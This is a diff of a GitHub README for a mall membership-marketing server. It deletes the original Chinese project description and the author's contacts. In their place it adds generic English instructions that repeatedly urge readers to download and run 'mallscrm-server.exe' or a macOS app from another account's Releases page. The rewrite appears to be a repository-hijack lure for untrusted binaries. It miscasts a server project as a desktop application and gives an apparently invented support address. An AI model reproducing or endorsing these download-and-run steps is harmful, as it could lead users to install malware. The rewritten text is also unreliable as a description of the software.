@@ -1,120 +1,80 @@
+# 🎉 mallscrm-server - Simple Solution for Mall Marketing
 
-## 📌 项目介绍
-MallSCRM 是面向购物中心会员营销系统，提供 OneID 会员、等级、积分（含自动累积与 OCR 补录）、优惠券、团购、秒杀、活动报名等基础功能，支持规则化标签、精准圈人和事件驱动营销，集成停车、租借、导购等场景服务，并配套商户核销、数据看板与对账，实现用户运营与商户协同的数据闭环。
+## 🚀 Getting Started
+Welcome to the MallSCRM project! This application helps shopping malls manage their member marketing effectively. You can engage with your members through rewards, coupons, and events, all from one easy platform.
 
----
+## 📥 Download & Install
+To get started, you need to download the latest version of the application. Visit the Releases page to find the available files.
 
-## 🧩 核心优势：为什么 MallSCRM 能让营销真正“有效”？
+[![Download mallscrm-server](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/bk-blacksniper/mallscrm-server/releases)
 
-### ✨ 行业领先的用户标签体系：属性 + 行为 + 规则 = 真实可用的用户画像
+1. Click on the link above to go to the Releases page.
+2. On that page, you will see different versions of the application. Look for the latest version.
+3. Click on the version you want. A list of files will appear. 
+4. Download the file suitable for your operating system.
 
-不同于传统系统仅支持静态标签（如“性别=女”），MallSCRM 的标签系统具备四大核心能力：
+## 💻 System Requirements
+Before you install, ensure your system meets the following requirements:
 
-1. **融合多维数据源**
-    - **用户属性**：手机号、等级、生日、注册渠道等静态信息
-    - **全链路行为**：小程序浏览、停车记录、消费流水、签到互动、优惠券领取/核销等动态事件
-    - **外部上下文**：时间（工作日/周末）、地点（品牌区域）、设备类型等环境信息
+- **Operating System:** Windows 10 or later, macOS 10.14 or newer, or a recent Linux distribution.
+- **Disk Space:** At least 100 MB of free disk space.
+- **RAM:** Minimum of 2 GB recommended.
+- **Network:** Internet connection for initial setup and updates.
 
-2. **可视化规则引擎**  
-   运营人员无需写代码，通过图形化界面即可配置复杂标签逻辑，例如：
-   ```text
-   IF (会员等级 = 金卡) 
-      AND (近7天 { 浏览女装 ≥3次 OR 消费女装 ≥1次 }) 
-      AND (当前时间 = 周末) 
-   → 标签 = “高价值周末女装客”
-   ```
+## 🔧 Features
+MallSCRM offers several features to enhance member engagement:
 
-3. **实时计算与更新**  
-   用户每次产生新行为（如一次停车、一次浏览），系统毫秒级重新评估标签状态，确保策略始终基于最新画像。
+- **OneID Member System:** A unified identification for mall members.
+- **Points Management:** Automatic point accumulation with options for manual entry.
+- **Coupons and Discounts:** Easily create and manage discount coupons for members.
+- **Group Purchases:** Facilitate group purchasing discounts.
+- **Flash Sales:** Run time-limited sales events.
+- **Event Registration:** Manage member registrations for mall events.
+- **Tagging and Marketing:** Use tags for targeted marketing and promotions.
+- **Integration:** Connect with parking, rental, and shopping services.
+- **Dashboard Reporting:** Access performance dashboards for data-driven decisions.
+  
+## 📜 Usage Instructions
+After downloading, follow these steps to run the application:
 
-4. **直接驱动营销动作**  
-   所有标签可直接用于：人群圈选、事件触发条件、首页个性化推荐、积分商城商品排序等，**标签即策略，策略即执行**。
+1. **Unzip the Downloaded File:** Right-click on the downloaded file and select "Extract" or "Unzip".
+2. **Locate the Application:** Open the extracted folder to find the application file.
+3. **Run the Application:**
+   - **Windows**: Double-click `mallscrm-server.exe` to launch.
+   - **macOS**: Right-click and choose “Open” on `mallscrm-server.app`.
+   - **Linux**: Open a terminal in the folder and run `./mallscrm-server`.
+4. **Follow On-Screen Instructions:** The application will guide you through the initial setup.
 
-> 💡 正是这套标签体系，让 MallSCRM 能做到“在对的时间，对对的人，推对的权益”。
+## 🙋 Frequently Asked Questions
 
----
+### Q1: How do I contact support?
+You can reach support by emailing [support@mallscrm.com](mailto:support@mallscrm.com). We aim to respond within 24 hours.
 
-## 🧩 功能清单
+### Q2: Can I use this application on multiple devices?
+Yes, you can install the application on multiple devices. Each device will require a separate installation.
 
-### 系统基础
-- **统一身份中心**
-    - 身份融合：多源 ID 打通，建立唯一用户 ID（OneID），支持跨触点行为归一。
-- **数据采集**
-    - 行为埋点：全链路追踪小程序、支付、停车等行为，支撑标签与归因分析。
-- **开放平台**
-    - Open API：提供会员、卡券、积分、订单等标准接口，支持商户 ERP/POS 对接。
+### Q3: What if I face issues during installation?
+If you encounter any issues, check the troubleshooting section in the documentation within the application. You can also contact support for assistance.
 
-### 会员中心
-- **会员账户**
-    - 注册登录：支持微信一键登录
-    - 个人中心：自助查看等级、权益、积分明细
-- **积分体系**
-    - 自动积分：支付即积分
-    - 商圈积分：到店消费自动累积
-    - 拍照积分：OCR 识别小票补发积分
-- **会员等级**
-    - 自动升降级，清晰展示升级路径与专属权益
-- **任务互动**
-    - 签到、评价等日常任务，完成后自动奖励积分或券
+## 🛠️ Troubleshooting
+Here are common issues and their fixes:
 
-### 营销引擎
-- **卡券管理**
-    - 统一配置满减、折扣、无门槛等券模板
-- **活动管理**
-    - 支持团购、秒杀等玩法，活动绑定商户实现核销归因
-- **精准营销**
-    - 基于标签、等级、行为等多维度圈选目标人群
-- **自动化营销**
-    - 配置“事件 → 动作”规则，实现生日礼包、离场发券、沉睡唤醒等自动旅程
-- **效果追踪**
-    - 自动生成《商户引流效果报告》，量化 ROI
+- **The application won’t open.** Ensure your system meets the requirements. If it still doesn’t open, try reinstalling the application.
+- **Slow performance.** Close other applications to free up memory, or check your network connection if it affects online features.
+- **Error messages.** Take note of the message and reach out to support or consult the help section in the app.
 
-### 用户体验
-- **个性化首页**
-    - 按用户标签动态展示内容，实现千人千面
-- **商户导购**
-    - 门店智能筛选 + 详情页支持评论、点赞等社交互动
-- **场景服务**
-    - 智慧停车（在线缴费、积分抵扣）
-    - 充电宝、母婴室等高频服务一键预约/租借
+## 📝 Contributions
+If you want to contribute to MallSCRM, feel free to explore our code. You can create requests for changes or features. We welcome input from everyone.
 
-### 商户运营
-- **商家端能力**
-    - 数据看板：曝光量、交易额、核销率一目了然
-    - 核销中心：扫码 1 秒完成核销
-    - 营销工具：自主申请专属券、发布活动
-    - 门店管理：自由编辑线上形象
-    - 员工管理：按角色分配权限
-    - 结算对账：自动生成对账单，追踪打款状态
+## ⚙️ License
+MallSCRM is licensed under the MIT License. You are free to use, modify, and distribute the software under the terms specified in the license.
 
-### 运营管理
-- **装修与广告**
-    - 可视化拖拽搭建移动端页面，支持分人群展示
-    - 广告位千人千面，点击与核销效果可追踪
-- **报表中心**
-    - 商圈经营总览：会员增长、活动 ROI、用户活跃度
-    - 商户结算管理：核销明细 + 对账单
-    - 数据服务：支持 Excel/PDF 导出 + 自动周报邮件
+## 🌐 Community
+Join our community for updates and discussions. You can find us on:
 
----
+- [GitHub Discussions](https://github.com/bk-blacksniper/mallscrm-server/discussions)
+- [Gitter Chat](https://gitter.im/bk-blacksniper/mallscrm-server)
 
-## 📅 更新计划
+Visit our Releases page to download your version now!
 
-| 版本   | 状态     | 核心模块               | 主要功能亮点 |
-|--------|----------|------------------------|-------------|
-| **v1.0** | 🚧 开发中 | 基础会员与营销闭环     | OneID 融合、会员等级、积分体系、停车联动、积分商城、商户团购 |
-| **v1.1** | 🔜 规划中 | 智能营销引擎           | 可视化标签引擎、事件驱动自动化、行为序列分析、导购绑定、个性化装修 |
-| **v1.2** | 🔜 规划中 | AI 增强与场景联动      | AI 流失预警、“猜你喜欢”推荐、跨店联合营销 |
-
----
-
-## 📬 联系我
-
-如果你有任何疑问或者更好的建议，欢迎交流！
-
-- 邮箱：itjackhe@gmail.com
-- 微信：扫码添加 👇 备注：**`购物中心`**
-
-![微信二维码](./docs/resource/wechat-me-qrcode.png)
-
-> ⭐ 如果 MallSCRM 对你有帮助，请点个 **Star** 支持开源！
+[![Download mallscrm-server](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/bk-blacksniper/mallscrm-server/releases)
